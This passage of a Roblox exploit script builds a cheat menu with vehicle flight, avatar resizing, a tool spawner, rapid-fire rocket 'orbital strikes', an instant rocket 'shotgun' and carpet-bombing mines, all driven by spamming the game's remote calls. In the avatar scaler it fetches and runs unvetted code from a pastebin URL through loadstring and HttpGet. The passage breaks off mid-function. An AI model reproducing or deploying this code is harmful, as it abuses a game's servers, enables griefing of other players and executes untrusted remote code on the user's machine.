    local bg = Instance.new("BodyGyro", base)
    bg.Name = "VehFlyGyro"
    bg.P = 3e4
    bg.D = 1e3
    bg.MaxTorque = Vector3.new(0, 9e9, 0)
    bg.CFrame = base.CFrame

    local bv = Instance.new("BodyVelocity", base)
    bv.Name = "VehFlyVelocity"
    bv.MaxForce = Vector3.new(9e9, 9e9, 9e9)
    bv.Velocity = Vector3.zero

    vFlyLoop = RunService.Heartbeat:Connect(function()
        if not car or not base.Parent then stopVehFly() return end
        base.AssemblyAngularVelocity = Vector3.zero
        
        local cam = workspace.CurrentCamera
        local look = cam.CFrame.LookVector
        local yaw = math.atan2(-look.X, -look.Z)
        bg.CFrame = CFrame.new(base.Position) * CFrame.Angles(0, yaw, 0)

        -- Calculate desired velocity
        local targetVelocity = Vector3.zero
        if UserInputService.TouchEnabled and not UserInputService.KeyboardEnabled then
            local success, controlModule = pcall(function() return require(LocalPlayer.PlayerScripts:WaitForChild("PlayerModule"):WaitForChild("ControlModule")) end)
            if success and controlModule then
                local dir = controlModule:GetMoveVector()
                if dir.Magnitude > 0 then
                    targetVelocity = (cam.CFrame.LookVector * -dir.Z + cam.CFrame.RightVector * dir.X) * (localFlySpeed * 50)
                end
            end
        else
            local forwardMag = flyKeys.f + flyKeys.b
            local rightMag = flyKeys.r + flyKeys.l
            local upMag = flyKeys.q + flyKeys.e
            targetVelocity = (cam.CFrame.LookVector * forwardMag + cam.CFrame.RightVector * rightMag + Vector3.new(0, upMag, 0)) * (localFlySpeed * 50)
        end
        
        -- ⭐ ANTI-STUCK BOUNDARY LIMITER (400 Studs)
        local myRoot = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        if myRoot then
            local distFromPlayer = (base.Position - myRoot.Position).Magnitude
            if distFromPlayer > 400 then
                -- Find the direction vector pointing FROM the player TO the car
                local vectorAwayFromPlayer = (base.Position - myRoot.Position).Unit
                -- Check if the car's intended velocity is pushing it further outward
                local outwardForce = targetVelocity:Dot(vectorAwayFromPlayer)
                
                if outwardForce > 0 then
                    -- Cancel out only the speed pushing it away, allow it to fly sideways or back towards you
                    targetVelocity = targetVelocity - (vectorAwayFromPlayer * outwardForce)
                end
            end
        end

        bv.Velocity = targetVelocity
    end)

    table.insert(flyInputs, UserInputService.InputBegan:Connect(function(i, gp)
        if gp then return end
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 1 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = -1 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = -1 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 1 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 1 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = -1 end
    end))
    table.insert(flyInputs, UserInputService.InputEnded:Connect(function(i)
        if i.KeyCode == Enum.KeyCode.W then flyKeys.f = 0 end
        if i.KeyCode == Enum.KeyCode.S then flyKeys.b = 0 end
        if i.KeyCode == Enum.KeyCode.A then flyKeys.l = 0 end
        if i.KeyCode == Enum.KeyCode.D then flyKeys.r = 0 end
        if i.KeyCode == Enum.KeyCode.E or i.KeyCode == Enum.KeyCode.Space then flyKeys.q = 0 end
        if i.KeyCode == Enum.KeyCode.Q or i.KeyCode == Enum.KeyCode.LeftShift then flyKeys.e = 0 end
    end))
end

VehFlyBtn.MouseButton1Click:Connect(function()
    vehFlyEnabled = not vehFlyEnabled
    if vehFlyEnabled then
        VehFlyBtn.Text = "🚗 Vehicle Fly: ON"
        VehFlyBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        startVehFly()
    else
        stopVehFly()
    end
end)

-- ==========================================
-- SMART HOLD LOGIC CONNECTION
-- ==========================================
applySmartHold(
    FlyBtn,        -- The button to click/hold
    FlyContainer,  -- The frame to expand/shrink
    40,            -- Normal collapsed height
    225,           -- Expanded height (to fit 4 buttons + 1 slider)
    0.5,           -- Hold duration
    
    function()
        localFlyEnabled = not localFlyEnabled
        if localFlyEnabled then
            FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
            startLocalFly()
        else
            FlyBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
            stopLocalFly()
        end
    end,
    
    function(isExpanded)
        if isExpanded then
            FlyBtn.Text = localFlyEnabled and "✈️ Local Fly: ON [▲ Options]" or "✈️ Local Fly: OFF [▲ Options]"
        else
            FlyBtn.Text = localFlyEnabled and "✈️ Local Fly: ON (Hold for Options)" or "✈️ Local Fly: OFF (Hold for Options)"
        end
    end
)
-- ========== AVATAR SCALER TOOL (Collapsible) ==========
local ScalerFrame = Instance.new("Frame")
ScalerFrame.Size = UDim2.new(1, -5, 0, 30) -- Starts collapsed
ScalerFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
ScalerFrame.BorderSizePixel = 0
ScalerFrame.ClipsDescendants = true
ScalerFrame.Parent = ToolsScroll

-- The Clickable Title / Dropdown Button
local ScalerToggleBtn = Instance.new("TextButton")
ScalerToggleBtn.Size = UDim2.new(1, 0, 0, 30)
ScalerToggleBtn.Position = UDim2.new(0, 0, 0, 0)
ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▼ ]"
ScalerToggleBtn.TextColor3 = Color3.fromRGB(0, 255, 200)
ScalerToggleBtn.Font = Enum.Font.SourceSansBold
ScalerToggleBtn.TextSize = 14
ScalerToggleBtn.TextXAlignment = Enum.TextXAlignment.Left
ScalerToggleBtn.BackgroundColor3 = Color3.fromRGB(25, 25, 32)
ScalerToggleBtn.BorderSizePixel = 0
ScalerToggleBtn.Parent = ScalerFrame

-- Container for all the inputs (Hidden by default)
local ScalerContent = Instance.new("Frame")
ScalerContent.Size = UDim2.new(1, 0, 1, -30)
ScalerContent.Position = UDim2.new(0, 0, 0, 30)
ScalerContent.BackgroundTransparency = 1
ScalerContent.Visible = false
ScalerContent.Parent = ScalerFrame

-- 1. Height
local HeightLabel = Instance.new("TextLabel")
HeightLabel.Size = UDim2.new(0, 60, 0, 20)
HeightLabel.Position = UDim2.new(0, 5, 0, 5)
HeightLabel.Text = "Height:"
HeightLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightLabel.Font = Enum.Font.SourceSansBold
HeightLabel.TextSize = 13
HeightLabel.BackgroundTransparency = 1
HeightLabel.Parent = ScalerContent

local HeightInput = Instance.new("TextBox")
HeightInput.Size = UDim2.new(0.3, -20, 0, 20)
HeightInput.Position = UDim2.new(0, 65, 0, 5)
HeightInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
HeightInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HeightInput.Font = Enum.Font.Code
HeightInput.TextSize = 13
HeightInput.Text = "1"
HeightInput.Parent = ScalerContent

-- 2. Width
local WidthLabel = Instance.new("TextLabel")
WidthLabel.Size = UDim2.new(0, 60, 0, 20)
WidthLabel.Position = UDim2.new(0, 5, 0, 30)
WidthLabel.Text = "Width:"
WidthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
WidthLabel.Font = Enum.Font.SourceSansBold
WidthLabel.TextSize = 13
WidthLabel.BackgroundTransparency = 1
WidthLabel.Parent = ScalerContent

local WidthInput = Instance.new("TextBox")
WidthInput.Size = UDim2.new(0.3, -20, 0, 20)
WidthInput.Position = UDim2.new(0, 65, 0, 30)
WidthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
WidthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
WidthInput.Font = Enum.Font.Code
WidthInput.TextSize = 13
WidthInput.Text = "1"
WidthInput.Parent = ScalerContent

-- 3. Depth
local DepthLabel = Instance.new("TextLabel")
DepthLabel.Size = UDim2.new(0, 60, 0, 20)
DepthLabel.Position = UDim2.new(0, 5, 0, 55)
DepthLabel.Text = "Depth:"
DepthLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
DepthLabel.Font = Enum.Font.SourceSansBold
DepthLabel.TextSize = 13
DepthLabel.BackgroundTransparency = 1
DepthLabel.Parent = ScalerContent

local DepthInput = Instance.new("TextBox")
DepthInput.Size = UDim2.new(0.3, -20, 0, 20)
DepthInput.Position = UDim2.new(0, 65, 0, 55)
DepthInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
DepthInput.TextColor3 = Color3.fromRGB(255, 255, 255)
DepthInput.Font = Enum.Font.Code
DepthInput.TextSize = 13
DepthInput.Text = "1"
DepthInput.Parent = ScalerContent

-- 4. Head
local HeadLabel = Instance.new("TextLabel")
HeadLabel.Size = UDim2.new(0, 60, 0, 20)
HeadLabel.Position = UDim2.new(0, 5, 0, 80)
HeadLabel.Text = "Head:"
HeadLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadLabel.Font = Enum.Font.SourceSansBold
HeadLabel.TextSize = 13
HeadLabel.BackgroundTransparency = 1
HeadLabel.Parent = ScalerContent

local HeadInput = Instance.new("TextBox")
HeadInput.Size = UDim2.new(0.3, -20, 0, 20)
HeadInput.Position = UDim2.new(0, 65, 0, 80)
HeadInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
HeadInput.TextColor3 = Color3.fromRGB(255, 255, 255)
HeadInput.Font = Enum.Font.Code
HeadInput.TextSize = 13
HeadInput.Text = "1"
HeadInput.Parent = ScalerContent

-- 5. BodyType
local BodyTypeLabel = Instance.new("TextLabel")
BodyTypeLabel.Size = UDim2.new(0, 60, 0, 20)
BodyTypeLabel.Position = UDim2.new(0, 5, 0, 105)
BodyTypeLabel.Text = "BodyType:"
BodyTypeLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
BodyTypeLabel.Font = Enum.Font.SourceSansBold
BodyTypeLabel.TextSize = 13
BodyTypeLabel.BackgroundTransparency = 1
BodyTypeLabel.Parent = ScalerContent

local BodyTypeInput = Instance.new("TextBox")
BodyTypeInput.Size = UDim2.new(0.3, -20, 0, 20)
BodyTypeInput.Position = UDim2.new(0, 65, 0, 105)
BodyTypeInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
BodyTypeInput.TextColor3 = Color3.fromRGB(255, 255, 255)
BodyTypeInput.Font = Enum.Font.Code
BodyTypeInput.TextSize = 13
BodyTypeInput.Text = "0"
BodyTypeInput.Parent = ScalerContent

local ApplyScaleBtn = Instance.new("TextButton")
ApplyScaleBtn.Size = UDim2.new(0.4, 0, 0, 120) 
ApplyScaleBtn.Position = UDim2.new(0.6, -5, 0, 5)
ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
ApplyScaleBtn.TextColor3 = Color3.fromRGB(0, 0, 0)
ApplyScaleBtn.Font = Enum.Font.SourceSansBold
ApplyScaleBtn.TextSize = 14
ApplyScaleBtn.Text = "Apply Sizes"
ApplyScaleBtn.BorderSizePixel = 0
ApplyScaleBtn.Parent = ScalerContent

-- Dropdown Toggle Logic
local scalerExpanded = false
ScalerToggleBtn.MouseButton1Click:Connect(function()
    scalerExpanded = not scalerExpanded
    if scalerExpanded then
        ScalerFrame.Size = UDim2.new(1, -5, 0, 165)
        ScalerContent.Visible = true
        ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▲ ]"
    else
        ScalerFrame.Size = UDim2.new(1, -5, 0, 30)
        ScalerContent.Visible = false
        ScalerToggleBtn.Text = "  📏 Custom Avatar Scaler [ ▼ ]"
    end
end)

-- Apply Button Logic
ApplyScaleBtn.MouseButton1Click:Connect(function()
    local char = LocalPlayer.Character
    if not char then return end
    local humanoid = char:FindFirstChildOfClass("Humanoid")
    if not humanoid then return end

    local success, description = pcall(function() return humanoid:GetAppliedDescription() end)
    if not success or not description then return end

    ApplyScaleBtn.Text = "Scanning..."
    
    local outfitData = {}
    local function getVal(prop)
        local ok, val = pcall(function() return description[prop] end)
        return (ok and val ~= nil) and val or nil
    end

    local hc = getVal("HeadColor")
    if typeof(hc) == "Color3" then outfitData.SkinTone = {hc.R, hc.G, hc.B} end

    local props = {"Face", "Shirt", "Pants", "GraphicTShirt", "Head", "Torso", "LeftArm", "RightArm", "LeftLeg", "RightLeg", "IdleAnimation", "WalkAnimation", "RunAnimation", "JumpAnimation", "FallAnimation", "ClimbAnimation", "SwimAnimation", "ProportionScale"}
    for _, p in ipairs(props) do outfitData[p] = getVal(p) end

    outfitData.Accessories = {}
    pcall(function()
        local accs = description:GetAccessories(true)
        if accs then
            for _, a in pairs(accs) do
                table.insert(outfitData.Accessories, {
                    AssetId = a.AssetId,
                    IsLayered = a.IsLayered,
                    AccessoryType = a.AccessoryType and tostring(a.AccessoryType):gsub("Enum.AccessoryType.", "") or a.AccessoryType
                })
            end
        end
    end)

    -- INJECT ALL CUSTOM SIZES
    outfitData.HeightScale = tonumber(HeightInput.Text) or 1
    outfitData.WidthScale = tonumber(WidthInput.Text) or 1
    outfitData.DepthScale = tonumber(DepthInput.Text) or 1
    outfitData.HeadScale = tonumber(HeadInput.Text) or 1
    outfitData.BodyTypeScale = tonumber(BodyTypeInput.Text) or 0

    local payload = buildBatchPayload(outfitData)
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)

    if not Send then
        ApplyScaleBtn.Text = "Loading Net..."
        pcall(function() loadstring(game:HttpGet("https://pastebin.com/raw/GiEmv8Qf"))() end)
        task.wait(1)
        Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    end

    if Send then
        ApplyScaleBtn.Text = "Applying..."
        task.spawn(function()
            for i = 1, 3 do Send("wear_outfit_from_desc", payload) task.wait(0.1) end
            task.wait(0.2)
            
            if outfitData.SkinTone then 
                pcall(function() 
                    local c = Color3.new(outfitData.SkinTone[1], outfitData.SkinTone[2], outfitData.SkinTone[3]) 
                    for i = 1, 3 do Send("skin_tone", c) task.wait(0.1) end 
                end) 
            end
            
            for i=1,3 do Send("body_scale", "HeightScale", outfitData.HeightScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "WidthScale", outfitData.WidthScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "DepthScale", outfitData.DepthScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "HeadScale", outfitData.HeadScale * 100) task.wait(0.05) end
            for i=1,3 do Send("body_scale", "BodyTypeScale", outfitData.BodyTypeScale * 100) task.wait(0.05) end
            if outfitData.ProportionScale then for i=1,3 do Send("body_scale", "ProportionScale", outfitData.ProportionScale * 100) task.wait(0.05) end end

            ApplyScaleBtn.Text = "Size Applied!"
            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
            task.wait(1.5)
            ApplyScaleBtn.Text = "Apply Sizes"
            ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
        end)
    else
        ApplyScaleBtn.Text = "Net Error"
        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
        task.wait(1.5)
        ApplyScaleBtn.Text = "Apply Sizes"
        ApplyScaleBtn.BackgroundColor3 = Color3.fromRGB(249, 180, 0)
    end
end)
------
-- -- ==============================================================
-- 🛠️ SMART PREMIUM TOOL SPAWNER (Hold for Options)
-- ==============================================================
local noCooldownEnabled = false
local isFiring = false

-- 1. Main Container
local ToolContainer = Instance.new("Frame")
ToolContainer.Size = UDim2.new(1, -5, 0, 40)
ToolContainer.BackgroundColor3 = Color3.fromRGB(30, 30, 38)
ToolContainer.BorderSizePixel = 0
ToolContainer.ClipsDescendants = true
ToolContainer.Parent = ToolsScroll

-- 2. The Main Button (Tool Spawner Bar)
local ToolMainBtn = Instance.new("TextButton")
ToolMainBtn.Size = UDim2.new(1, 0, 0, 40)
ToolMainBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
ToolMainBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolMainBtn.Font = Enum.Font.SourceSansBold
ToolMainBtn.TextSize = 16
ToolMainBtn.Text = "🛠️ Tool Spawner (Hold for Options)"
ToolMainBtn.BorderSizePixel = 0
ToolMainBtn.Parent = ToolContainer
Instance.new("UICorner", ToolMainBtn).CornerRadius = UDim.new(0, 8)

-- 3. Tool Name Input Box
local ToolInput = Instance.new("TextBox")
ToolInput.Size = UDim2.new(1, -20, 0, 30)
ToolInput.Position = UDim2.new(0, 10, 0, 45)
ToolInput.PlaceholderText = "Type tool name (e.g. Jetpack, RocketLauncher)"
ToolInput.BackgroundColor3 = Color3.fromRGB(15, 15, 18)
ToolInput.TextColor3 = Color3.fromRGB(255, 255, 255)
ToolInput.Font = Enum.Font.SourceSansBold
ToolInput.TextSize = 13
ToolInput.Text = ""
ToolInput.ClearTextOnFocus = false
ToolInput.Parent = ToolContainer
Instance.new("UICorner", ToolInput).CornerRadius = UDim.new(0, 6)

-- 4. Get Tool Action Button
local SpawnToolBtn = Instance.new("TextButton")
SpawnToolBtn.Size = UDim2.new(1, -20, 0, 32)
SpawnToolBtn.Position = UDim2.new(0, 10, 0, 82)
SpawnToolBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
SpawnToolBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
SpawnToolBtn.Font = Enum.Font.SourceSansBold
SpawnToolBtn.TextSize = 14
SpawnToolBtn.Text = "Get Tool"
SpawnToolBtn.BorderSizePixel = 0
SpawnToolBtn.Parent = ToolContainer
Instance.new("UICorner", SpawnToolBtn).CornerRadius = UDim.new(0, 6)

-- 5. Rapid Fire Toggle Button
local NoCooldownBtn = Instance.new("TextButton")
NoCooldownBtn.Size = UDim2.new(1, -20, 0, 32)
NoCooldownBtn.Position = UDim2.new(0, 10, 0, 120) -- 1st Button
NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
NoCooldownBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
NoCooldownBtn.Font = Enum.Font.SourceSansBold
NoCooldownBtn.TextSize = 14
NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
NoCooldownBtn.BorderSizePixel = 0
NoCooldownBtn.Parent = ToolContainer
Instance.new("UICorner", NoCooldownBtn).CornerRadius = UDim.new(0, 6)


-- 6. Explosive Trait Toggle Button 
local ShotgunBtn = Instance.new("TextButton")
ShotgunBtn.Size = UDim2.new(1, -20, 0, 32)
ShotgunBtn.Position = UDim2.new(0, 10, 0, 160) -- 3rd Button (Pushed down by 40)
ShotgunBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
ShotgunBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ShotgunBtn.Font = Enum.Font.SourceSansBold
ShotgunBtn.TextSize = 14
ShotgunBtn.Text = "💥 True Shotgun: OFF"
ShotgunBtn.BorderSizePixel = 0
ShotgunBtn.Parent = ToolContainer
Instance.new("UICorner", ShotgunBtn).CornerRadius = UDim.new(0, 6)

-- 1. 🔘 THE TOGGLE BUTTON
local ScatterMinesBtn = Instance.new("TextButton")
ScatterMinesBtn.Size = UDim2.new(1, -20, 0, 32)
ScatterMinesBtn.Position = UDim2.new(0, 10, 0, 200) -- Adjust this Y position depending on your UI layout
ScatterMinesBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
ScatterMinesBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
ScatterMinesBtn.Font = Enum.Font.SourceSansBold
ScatterMinesBtn.TextSize = 14
ScatterMinesBtn.Text = "💣 Scatter Mines: OFF"
ScatterMinesBtn.BorderSizePixel = 0
ScatterMinesBtn.Parent = ToolContainer 
Instance.new("UICorner", ScatterMinesBtn).CornerRadius = UDim.new(0, 6)



-- ==========================================
-- TOOL SPAWN LOGIC
-- ==========================================
local knownTools = {
    "Jetpack", "RocketLauncher", "Parachute", "Segway", "Hoverboard", 
    "Glider", "BoomBox", "Sign", "Stroller", "Skateboard", "Flashlight", "Explosive"
}

SpawnToolBtn.MouseButton1Click:Connect(function()
    local inputName = string.lower(ToolInput.Text:gsub("%s+", ""))
    if inputName == "" then return end

    local foundName = nil
    for _, v in ipairs(knownTools) do
        if string.lower(v):find(inputName, 1, true) then
            foundName = v
            break
        end
    end

    local targetTool = foundName or ToolInput.Text
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if Send then
        Send("get_tool", targetTool)
        SpawnToolBtn.Text = "Received: " .. targetTool
        SpawnToolBtn.BackgroundColor3 = Color3.fromRGB(0, 200, 100)
        task.delay(1.5, function()
            SpawnToolBtn.Text = "Get Tool"
            SpawnToolBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
        end)
    end
end)

-- ==========================================
-- ⚡ MAX-SPEED RAPID FIRE (ORBITAL STRIKE - TARGET RL ENGINE)
-- ==========================================
local isFiring = false

NoCooldownBtn.MouseButton1Click:Connect(function()
    noCooldownEnabled = not noCooldownEnabled
    
    if noCooldownEnabled then
        NoCooldownBtn.Text = "⚡ Orbital Strike: ON"
        NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(40, 170, 90)
    else
        NoCooldownBtn.Text = "⚡ Orbital Strike: OFF"
        NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        isFiring = false
    end
end)

local UserInputService = game:GetService("UserInputService")
local player = game:GetService("Players").LocalPlayer
local mouse = player:GetMouse()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed and input.UserInputType ~= Enum.UserInputType.Touch then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if noCooldownEnabled and not isFiring then
            isFiring = true
            
            local char = player.Character
            local bp = player:FindFirstChild("Backpack")
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            
            -- Clear old tools
            pcall(function()
                if Send then Send("delete_tool") end
                if char then
                    for _, v in ipairs(char:GetChildren()) do
                        if v:IsA("Tool") and v.Name == "RocketLauncher" then v:Destroy() end
                    end
                end
                if bp then
                    for _, v in ipairs(bp:GetChildren()) do
                        if v.Name == "RocketLauncher" then v:Destroy() end
                    end
                end
            end)
            
            -- MAX SPEED LOOP (Using Target RL Engine)
            task.spawn(function()
                while isFiring and noCooldownEnabled do
                    local currentChar = player.Character
                    local currentBp = player:FindFirstChild("Backpack")
                    
                    if not currentChar or not currentBp then break end
                    
                    -- FAST CHECK: Look for existing launcher first
                    local newLauncher = currentChar:FindFirstChild("RocketLauncher") or currentBp:FindFirstChild("RocketLauncher")
                    
                    if not newLauncher then
                        if Send then Send("get_tool", "RocketLauncher") end
                        
                        -- FAST WAIT: Custom loop instead of WaitForChild
                        local timer = 0
                        while timer < 0.2 do
                            newLauncher = currentChar:FindFirstChild("RocketLauncher") or currentBp:FindFirstChild("RocketLauncher")
                            if newLauncher then break end
                            timer = timer + task.wait(0.01)
                        end
                    end
                    
                    if newLauncher then
                        -- PROTECTED EQUIP
                        local equipSuccess = pcall(function()
                            newLauncher.Parent = currentChar
                        end)
                        
                        if equipSuccess then
                            local targetHit = mouse.Hit.Position
                            
                            -- BURST FIRE
                            pcall(function()
                                for i = 1, 4 do
                                    local spreadX = math.random(-20, 20)
                                    local spreadZ = math.random(-20, 20)
                                    local skyPos = targetHit + Vector3.new(spreadX, 50, spreadZ) 
                                    local targetCFrame = CFrame.new(skyPos, targetHit)
                                    
                                    if Send then Send("shoot_rocket", newLauncher, targetCFrame) end
                                end
                            end)
                        end
                        
                        -- PROTECTED DELETE
                        pcall(function()
                            if Send then Send("delete_tool") end
                            newLauncher:Destroy()
                        end)
                    else
                        -- Server lag buffer
                        task.wait(0.05)
                    end
                    
                    task.wait(0.01) 
                end
                
                -- Restock when you let go
                if Send and noCooldownEnabled then 
                    Send("get_tool", "RocketLauncher") 
                end
            end)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isFiring = false
    end
end)
-- ==========================================
-- 💥 TRUE SHOTGUN (INSTANT DETONATION BURST)
-- ==========================================
local isShotgunActive = false
local isFiring = false

ShotgunBtn.MouseButton1Click:Connect(function()
    isShotgunActive = not isShotgunActive
    if isShotgunActive then
        ShotgunBtn.Text = "💥 True Shotgun: ON"
        ShotgunBtn.BackgroundColor3 = Color3.fromRGB(220, 40, 40) -- Aggressive Red
        
        -- 🛑 ANTI-CONFLICT: Turn off normal Rapid Fire if it's on
        if noCooldownEnabled then
            noCooldownEnabled = false
            if NoCooldownBtn then
                NoCooldownBtn.Text = "⚡ Rapid Fire: OFF"
                NoCooldownBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
            end
        end
    else
        ShotgunBtn.Text = "💥 True Shotgun: OFF"
        ShotgunBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        isFiring = false
    end
end)

local UserInputService = game:GetService("UserInputService")
local player = game:GetService("Players").LocalPlayer
local mouse = player:GetMouse()

UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if gameProcessed and input.UserInputType ~= Enum.UserInputType.Touch then return end
    
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        if isShotgunActive and not isFiring then
            isFiring = true
            local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
            
            -- Clear out old inventory to prevent jams
            if Send then Send("delete_tool") end
            
            task.spawn(function()
                while isFiring and isShotgunActive do
                    local currentChar = player.Character
                    local currentBp = player:FindFirstChild("Backpack")
                    
                    if not currentChar or not currentBp then break end
                    
                    -- Capture exact click location
                    local targetHit = mouse.Hit.Position
                    
                    -- 🔥 THE OVERLAP TRICK: Wraps the shot in its OWN background thread.
                    task.spawn(function()
                        if Send then Send("get_tool", "RocketLauncher") end
                        
                        local newLauncher = currentBp:WaitForChild("RocketLauncher", 0.15)
                        
                        if newLauncher then
                            pcall(function()
                                newLauncher.Parent = currentChar
                                
                                -- 💥 BIGGER BURST: Spam 7 rockets instantly at the cursor
                                for i = 1, 8 do
                                    -- Add a tiny cluster spread around the cursor so the explosions stack massive damage
                                    local spreadX = math.random(-20, 20) / 10
                                    local spreadZ = math.random(-20, 20) / 10
                                    
                                    -- Spawn exactly at the mouse click with the tiny spread, and point straight down to instantly detonate
                                    local spawnPos = targetHit + Vector3.new(spreadX, 0, spreadZ)
                                    local targetCFrame = CFrame.new(spawnPos, spawnPos - Vector3.new(0, 1, 0))
                                    
                                    if Send then Send("shoot_rocket", newLauncher, targetCFrame) end
                                end
                                
                                if Send then Send("delete_tool") end
                                newLauncher:Destroy()
                            end)
                        end
                    end)
                    
                    -- Wait a microscopic amount of time before spawning the next thread.
                    task.wait(0.03) 
                end
                
                -- Give you a gun back when you release the mouse
                if Send and isShotgunActive then Send("get_tool", "RocketLauncher") end
            end)
        end
    end
end)

UserInputService.InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
        isFiring = false
    end
end)

-- ==========================================
-- 💣 SCATTER MINES: CARPET BOMBING LOGIC
-- ==========================================
local isScattering = false
local currentRadius = 50 
local visualCircle = nil
local updateLoop = nil
local player = game:GetService("Players").LocalPlayer

-- 🎚️ GENERATE THE RADIUS SLIDER (Make sure createSlider is defined above this!)
local radSlider = createSlider(ToolContainer, "Mines Radius: ", 1, 1000, 50, function(newValue)
    currentRadius = newValue
end)
radSlider.Position = UDim2.new(0, 10, 0, 240)

local function cleanUpVisualizer()
    if visualCircle then
        visualCircle:Destroy()
        visualCircle = nil
    end
    if updateLoop then
        updateLoop:Disconnect()
        updateLoop = nil
    end
end

ScatterMinesBtn.MouseButton1Click:Connect(function()
    isScattering = not isScattering
    local Send = getgenv().Send or (getgenv().g and getgenv().g.Send)
    
    if isScattering then
        ScatterMinesBtn.Text = "💣 Scatter Mines: ON"
        ScatterMinesBtn.BackgroundColor3 = Color3.fromRGB(200, 100, 50)
        
        -- 🎨 Create the Client-Side Visual Circle
        visualCircle = Instance.new("Part")
        visualCircle.Shape = Enum.PartType.Cylinder
        visualCircle.Material = Enum.Material.ForceField
        visualCircle.Color = Color3.fromRGB(200, 50, 50)
        visualCircle.Transparency = 0.5
        visualCircle.Anchored = true
        visualCircle.CanCollide = false
        visualCircle.CastShadow = false
        visualCircle.Parent = workspace
        
        -- 🔄 Update the circle's position to follow you
        updateLoop = game:GetService("RunService").RenderStepped:Connect(function()
            local char = player.Character
            local root = char and char:FindFirstChild("HumanoidRootPart")
            if root and visualCircle then
                visualCircle.Size = Vector3.new(0.2, currentRadius * 2, currentRadius * 2)
                visualCircle.CFrame = CFrame.new(root.Position - Vector3.new(0, 2.9, 0)) * CFrame.Angles(0, 0, math.rad(90))
            end
        end)
        
        -- 💣 The Spawner Loop
        task.spawn(function()
            while isScattering do
                local char = player.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                
                if root and Send then
                    Send("get_tool", "Explosive")
                    local bp = player:FindFirstChild("Backpack")
                    local currentExp = char:FindFirstChild("Explosive") or (bp and bp:FindFirstChild("Explosive"))
                    
                    if currentExp then
                        pcall(function() currentExp.Parent = char end)
                        
                        -- 📐 Simplified Scatter: Picks 5 DIFFERENT spots per tick to flood huge areas!
                        for i = 1, 5 do
                            -- Dead-simple math: pick a random X and Z between negative and positive radius
                            local randomX = math.random(-currentRadius, currentRadius)
                            local randomZ = math.random(-currentRadius, currentRadius)
                            
                            local dropPos = root.Position + Vector3.new(randomX, -2.5, randomZ)
                            
                            Send("place", dropPos, Vector3.new(0, 1, 0))
                        end
                        
                        Send("delete_tool")
                        currentExp:Destroy()
                    end
                end
                task.wait(0.01) 
            end
            
            if Send then Send("delete_tool") end
        end)
    else
        ScatterMinesBtn.Text = "💣 Scatter Mines: OFF"
        ScatterMinesBtn.BackgroundColor3 = Color3.fromRGB(50, 50, 65)
        cleanUpVisualizer()
    end
end)

-- Clean up the visualizer if your character resets or dies
player.CharacterAdded:Connect(function()
    if isScattering then
